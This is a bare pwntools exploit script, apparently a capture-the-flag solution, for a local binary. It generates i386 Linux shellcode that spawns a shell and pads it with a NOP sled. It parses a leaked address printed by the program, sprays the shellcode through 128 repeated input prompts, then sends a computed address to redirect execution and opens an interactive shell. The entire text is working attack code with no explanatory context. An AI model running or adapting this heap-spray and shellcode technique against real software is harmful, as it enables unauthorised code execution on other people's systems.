from pwn import *
#context.log_level = 'debug'

sh = asm(shellcraft.i386.linux.sh())
shellcode = '\x90'*(0x200-len(sh)) + sh

t = process('./bin')

t.recvuntil('some hint for you ')
addr = t.recvline()[:-1]
addr = int(addr, 16)

t.recvuntil('say?\n')
t.send(shellcode)
for i in range(128):
    t.recvuntil('say?\n')
    t.sendline('y')
    t.recvuntil('word:\n')
    t.send(shellcode)

t.recvuntil('say?\n')
t.sendline('n')

t.recvuntil('number\n')
t.sendline(str(addr + 0x100 * 0x100))

t.interactive()
